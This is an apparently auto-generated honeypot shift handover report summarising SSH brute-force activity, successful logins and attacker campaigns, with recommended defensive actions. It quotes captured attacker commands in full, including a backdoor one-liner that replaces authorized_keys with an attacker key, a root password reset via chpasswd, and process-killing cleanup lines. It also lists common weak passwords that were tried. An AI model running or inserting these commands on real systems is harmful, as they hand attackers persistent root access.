# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-03 |
| **Generated At** | 2026-05-03T20:51:07Z |
| **Shift Time** | 20:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **274** |
| Confirmed Threats | **262** |
| False Positives Filtered | **12** (4.4%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **18** |
| High Severity Cases | **71** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **203** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **210** |
| Unique Credential Pairs | **97** |
| Unique Usernames | **40** |
| Unique Passwords | **90** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 71 |
| `345gs5662d34` | 36 |
| `ubuntu` | 17 |
| `oracle` | 5 |
| `git` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 36 |
| `3245gs5662d34` | 35 |
| `123` | 8 |
| `q1w2e3r4` | 4 |
| `test` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 36 |
| `root` | `3245gs5662d34` | 35 |
| `wp-user` | `1q2w3e4r` | 3 |
| `user4` | `12345` | 3 |
| `ubuntu` | `Pa$$word` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `testman1` | `122.168.194.41` | 2026-05-03T19:19:15 |
| `root` | `3245gs5662d34` | `122.168.194.41` | 2026-05-03T19:19:17 |
| `root` | `supervisor123` | `101.126.141.163` | 2026-05-03T19:28:08 |
| `root` | `3245gs5662d34` | `101.126.141.163` | 2026-05-03T19:28:14 |
| `root` | `odoo1234` | `122.168.194.41` | 2026-05-03T19:34:40 |
| `root` | `odoo1234` | `79.55.224.44` | 2026-05-03T19:36:29 |
| `root` | `3245gs5662d34` | `79.55.224.44` | 2026-05-03T19:36:32 |
| `root` | `user1123` | `122.168.194.41` | 2026-05-03T19:38:27 |
| `root` | `ali@123` | `122.168.194.41` | 2026-05-03T19:45:09 |
| `root` | `testman1` | `79.55.224.44` | 2026-05-03T19:45:14 |
| `root` | `user1123` | `79.55.224.44` | 2026-05-03T19:50:15 |
| `root` | `Admin@123.com` | `165.154.205.128` | 2026-05-03T19:51:27 |
| `root` | `3245gs5662d34` | `165.154.205.128` | 2026-05-03T19:51:29 |
| `root` | `idc@2018` | `165.154.205.128` | 2026-05-03T19:52:29 |
| `root` | `Pa$$word@2026` | `165.154.205.128` | 2026-05-03T19:53:26 |
| `root` | `12345@Qwert` | `165.154.205.128` | 2026-05-03T19:54:23 |
| `root` | `admin2025@` | `165.154.205.128` | 2026-05-03T19:55:18 |
| `root` | `123456b` | `165.154.205.128` | 2026-05-03T19:56:14 |
| `root` | `#EDC4rfv` | `165.154.205.128` | 2026-05-03T19:58:12 |
| `root` | `qweasdzxc321` | `165.154.205.128` | 2026-05-03T19:59:09 |
| `root` | `qwert@12345` | `165.154.205.128` | 2026-05-03T20:00:07 |
| `root` | `ali@123` | `79.55.224.44` | 2026-05-03T20:00:34 |
| `root` | `Root123456!` | `165.154.205.128` | 2026-05-03T20:01:01 |
| `root` | `bobby` | `165.154.205.128` | 2026-05-03T20:03:57 |
| `root` | `kingdee@123` | `165.154.205.128` | 2026-05-03T20:04:58 |
| `root` | `chenjie520` | `165.154.205.128` | 2026-05-03T20:05:57 |
| `root` | `Admin@123456789` | `165.154.205.128` | 2026-05-03T20:06:55 |
| `root` | `testtest` | `165.154.205.128` | 2026-05-03T20:07:52 |
| `root` | `QAZ@WSX3edc` | `165.154.205.128` | 2026-05-03T20:08:49 |
| `root` | `qwerqwer123` | `165.154.205.128` | 2026-05-03T20:09:46 |
| `root` | `gameserver` | `165.154.205.128` | 2026-05-03T20:11:40 |
| `root` | `pass123@` | `165.154.205.128` | 2026-05-03T20:12:35 |
| `root` | `qwe741` | `165.154.205.128` | 2026-05-03T20:13:31 |
| `root` | `Aa123456!!` | `165.154.205.128` | 2026-05-03T20:14:29 |
| `root` | `Qwertyuiop123` | `165.154.205.128` | 2026-05-03T20:15:28 |
| `root` | `zaq123edc` | `165.154.205.128` | 2026-05-03T20:16:28 |
| `root` | `apples` | `165.154.205.128` | 2026-05-03T20:17:28 |
| `root` | `testnet` | `34.78.29.97` | 2026-05-03T20:35:41 |
| `root` | `3245gs5662d34` | `34.78.29.97` | 2026-05-03T20:35:45 |
| `root` | `mysql2024` | `34.78.29.97` | 2026-05-03T20:37:13 |
| `root` | `admin2022` | `14.103.115.106` | 2026-05-03T20:49:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **274** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 219 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 156 | 7 |
| `03a80b21afa8...` | Modern SSH client | 62 | 10 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 156 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 62 | 10 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ctt7b3i7ASmz"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.106`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.126.141.163`, `34.78.29.97`, `79.55.224.44`, `122.168.194.41`, `165.154.205.128`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **28** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS134760` | Shijiazhuang IDC network, CHINANET Hebei province | 1 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | LOW |
| `AS135089` | China Telecom | 1 | HIGH |
| `AS21826` | Corporación Telemic C.A. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (71)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ac760db07e6f

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:19 |
| **Last Seen** | 2026-05-03 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:19:15` | `cowrie.session.connect` |
| `2026-05-03 19:19:15` | `cowrie.client.version` |
| `2026-05-03 19:19:15` | `cowrie.client.kex` |
| `2026-05-03 19:19:15` | `cowrie.login.success` |
| `2026-05-03 19:19:15` | `cowrie.session.params` |
| `2026-05-03 19:19:15` | `cowrie.command.input` |
| `2026-05-03 19:19:15` | `cowrie.command.failed` |
| `2026-05-03 19:19:15` | `cowrie.log.closed` |
| `2026-05-03 19:19:15` | `cowrie.session.params` |
| `2026-05-03 19:19:15` | `cowrie.command.input` |
| `2026-05-03 19:19:15` | `cowrie.session.file_download` |
| `2026-05-03 19:19:15` | `cowrie.log.closed` |
| `2026-05-03 19:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf1fbd71b93

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:19 |
| **Last Seen** | 2026-05-03 19:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:19:17` | `cowrie.session.connect` |
| `2026-05-03 19:19:17` | `cowrie.client.version` |
| `2026-05-03 19:19:17` | `cowrie.client.kex` |
| `2026-05-03 19:19:17` | `cowrie.login.success` |
| `2026-05-03 19:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88ee69eb0ce

| Field | Detail |
|---|---|
| **Source IP** | `101.126.141[.]163` |
| **First Seen** | 2026-05-03 19:28 |
| **Last Seen** | 2026-05-03 19:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:28:07` | `cowrie.session.connect` |
| `2026-05-03 19:28:07` | `cowrie.client.version` |
| `2026-05-03 19:28:08` | `cowrie.client.kex` |
| `2026-05-03 19:28:08` | `cowrie.login.success` |
| `2026-05-03 19:28:09` | `cowrie.session.params` |
| `2026-05-03 19:28:09` | `cowrie.command.input` |
| `2026-05-03 19:28:09` | `cowrie.command.failed` |
| `2026-05-03 19:28:09` | `cowrie.log.closed` |
| `2026-05-03 19:28:10` | `cowrie.session.params` |
| `2026-05-03 19:28:10` | `cowrie.command.input` |
| `2026-05-03 19:28:10` | `cowrie.session.file_download` |
| `2026-05-03 19:28:10` | `cowrie.log.closed` |
| `2026-05-03 19:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.141[.]163` to AbuseIPDB if not already reported
- [ ] Block `101.126.141[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2656957786

| Field | Detail |
|---|---|
| **Source IP** | `101.126.141[.]163` |
| **First Seen** | 2026-05-03 19:28 |
| **Last Seen** | 2026-05-03 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:28:13` | `cowrie.session.connect` |
| `2026-05-03 19:28:13` | `cowrie.client.version` |
| `2026-05-03 19:28:13` | `cowrie.client.kex` |
| `2026-05-03 19:28:14` | `cowrie.login.success` |
| `2026-05-03 19:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.141[.]163` to AbuseIPDB if not already reported
- [ ] Block `101.126.141[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a932d331baf1

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:34 |
| **Last Seen** | 2026-05-03 19:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:34:40` | `cowrie.session.connect` |
| `2026-05-03 19:34:40` | `cowrie.client.version` |
| `2026-05-03 19:34:40` | `cowrie.client.kex` |
| `2026-05-03 19:34:40` | `cowrie.login.success` |
| `2026-05-03 19:34:40` | `cowrie.session.params` |
| `2026-05-03 19:34:40` | `cowrie.command.input` |
| `2026-05-03 19:34:40` | `cowrie.command.failed` |
| `2026-05-03 19:34:40` | `cowrie.log.closed` |
| `2026-05-03 19:34:40` | `cowrie.session.params` |
| `2026-05-03 19:34:40` | `cowrie.command.input` |
| `2026-05-03 19:34:40` | `cowrie.session.file_download` |
| `2026-05-03 19:34:40` | `cowrie.log.closed` |
| `2026-05-03 19:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5332c338b6

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:34 |
| **Last Seen** | 2026-05-03 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:34:42` | `cowrie.session.connect` |
| `2026-05-03 19:34:42` | `cowrie.client.version` |
| `2026-05-03 19:34:42` | `cowrie.client.kex` |
| `2026-05-03 19:34:42` | `cowrie.login.success` |
| `2026-05-03 19:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65af04de924

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:36 |
| **Last Seen** | 2026-05-03 19:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:36:28` | `cowrie.session.connect` |
| `2026-05-03 19:36:28` | `cowrie.client.version` |
| `2026-05-03 19:36:28` | `cowrie.client.kex` |
| `2026-05-03 19:36:29` | `cowrie.login.success` |
| `2026-05-03 19:36:29` | `cowrie.session.params` |
| `2026-05-03 19:36:29` | `cowrie.command.input` |
| `2026-05-03 19:36:29` | `cowrie.command.failed` |
| `2026-05-03 19:36:29` | `cowrie.log.closed` |
| `2026-05-03 19:36:30` | `cowrie.session.params` |
| `2026-05-03 19:36:30` | `cowrie.command.input` |
| `2026-05-03 19:36:30` | `cowrie.session.file_download` |
| `2026-05-03 19:36:30` | `cowrie.log.closed` |
| `2026-05-03 19:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0464a752c1f7

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:36 |
| **Last Seen** | 2026-05-03 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:36:32` | `cowrie.session.connect` |
| `2026-05-03 19:36:32` | `cowrie.client.version` |
| `2026-05-03 19:36:32` | `cowrie.client.kex` |
| `2026-05-03 19:36:32` | `cowrie.login.success` |
| `2026-05-03 19:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc422516aab

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:38 |
| **Last Seen** | 2026-05-03 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:38:27` | `cowrie.session.connect` |
| `2026-05-03 19:38:27` | `cowrie.client.version` |
| `2026-05-03 19:38:27` | `cowrie.client.kex` |
| `2026-05-03 19:38:27` | `cowrie.login.success` |
| `2026-05-03 19:38:27` | `cowrie.session.params` |
| `2026-05-03 19:38:27` | `cowrie.command.input` |
| `2026-05-03 19:38:27` | `cowrie.command.failed` |
| `2026-05-03 19:38:27` | `cowrie.log.closed` |
| `2026-05-03 19:38:27` | `cowrie.session.params` |
| `2026-05-03 19:38:27` | `cowrie.command.input` |
| `2026-05-03 19:38:27` | `cowrie.session.file_download` |
| `2026-05-03 19:38:27` | `cowrie.log.closed` |
| `2026-05-03 19:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f39ad49772f

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:38 |
| **Last Seen** | 2026-05-03 19:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:38:29` | `cowrie.session.connect` |
| `2026-05-03 19:38:29` | `cowrie.client.version` |
| `2026-05-03 19:38:29` | `cowrie.client.kex` |
| `2026-05-03 19:38:29` | `cowrie.login.success` |
| `2026-05-03 19:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1a662fae52

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:45 |
| **Last Seen** | 2026-05-03 19:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:45:09` | `cowrie.session.connect` |
| `2026-05-03 19:45:09` | `cowrie.client.version` |
| `2026-05-03 19:45:09` | `cowrie.client.kex` |
| `2026-05-03 19:45:09` | `cowrie.login.success` |
| `2026-05-03 19:45:09` | `cowrie.session.params` |
| `2026-05-03 19:45:09` | `cowrie.command.input` |
| `2026-05-03 19:45:09` | `cowrie.command.failed` |
| `2026-05-03 19:45:09` | `cowrie.log.closed` |
| `2026-05-03 19:45:09` | `cowrie.session.params` |
| `2026-05-03 19:45:09` | `cowrie.command.input` |
| `2026-05-03 19:45:09` | `cowrie.session.file_download` |
| `2026-05-03 19:45:09` | `cowrie.log.closed` |
| `2026-05-03 19:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
